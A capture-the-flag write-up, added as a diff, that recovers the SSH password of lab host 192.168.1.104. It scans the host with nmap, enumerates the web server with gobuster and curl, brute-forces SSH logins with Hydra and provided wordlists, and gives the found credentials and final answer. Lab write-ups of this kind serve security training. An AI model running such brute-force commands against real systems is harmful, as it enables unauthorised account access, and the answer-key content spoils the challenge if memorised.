@@ -1,0 +1,132 @@
+# Challenge 100 – Find the SSH Login Password
+
+### Question
+
+**What is the password that lets you remotely login to the machine `192.168.1.104`?**
+
+**Answer format:** `xxxxxxNNN`
+
+---
+
+## Step 1: Scan the Target
+
+First, we scanned the target to identify open ports and services.
+
+```bash
+nmap -sV -sC 192.168.1.104
+```
+
+### Important result
+
+```text
+22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp   open   http    Apache httpd 2.4.52
+```
+
+### Observation
+
+* Port **22** → SSH is running.
+* Port **80** → HTTP web server is running.
+* Since the question asks for a password that allows **remote login**, SSH is the important service.
+
+---
+
+## Step 2: Check the Web Server
+
+We checked for common directories/files:
+
+```bash
+gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/common.txt -x php,txt
+```
+
+The web server mainly showed the default Apache page.
+
+We also checked the page for useful information:
+
+```bash
+curl -s http://192.168.1.104/index.html | grep -iE 'password|user|login|ssh|secret|key|<!--'
+```
+
+No useful username or password was found.
+
+### Conclusion
+
+The web server did not directly reveal the required credential, so we focused on the **SSH service on port 22**.
+
+---
+
+## Step 3: Identify Valid SSH Credentials
+
+The challenge provides username and password wordlists:
+
+```text
+Usernames.txt
+Passwords.txt
+```
+
+We can test the usernames and passwords against the SSH service using **Hydra**.
+
+```bash
+hydra -L Usernames.txt -P Passwords.txt 192.168.1.104 ssh -t 16 -f
+```
+
+### Meaning of the command
+
+* `-L Usernames.txt` → use usernames from the file
+* `-P Passwords.txt` → use passwords from the file
+* `192.168.1.104` → target machine
+* `ssh` → attack the SSH login service
+* `-t 16` → use 16 parallel tasks
+* `-f` → stop after finding a valid login
+
+---
+
+## Step 4: Hydra Finds the Valid Login
+
+Hydra identifies the valid credentials:
+
+```text
+[22][ssh] host: 192.168.1.104
+login: rebecca
+password: qwerty123
+```
+
+Therefore:
+
+**Username:**
+
+```text
+rebecca
+```
+
+**Password:**
+
+```text
+qwerty123
+```
+
+---
+
+## Final Answer
+
+```text
+qwerty123
+```
+
+### Short Method
+
+```text
+Nmap
+  ↓
+Port 22 SSH discovered
+  ↓
+Web enumeration did not reveal credentials
+  ↓
+Hydra + provided username/password lists
+  ↓
+Valid SSH account found
+  ↓
+rebecca : qwerty123
+  ↓
+Answer = qwerty123
+```
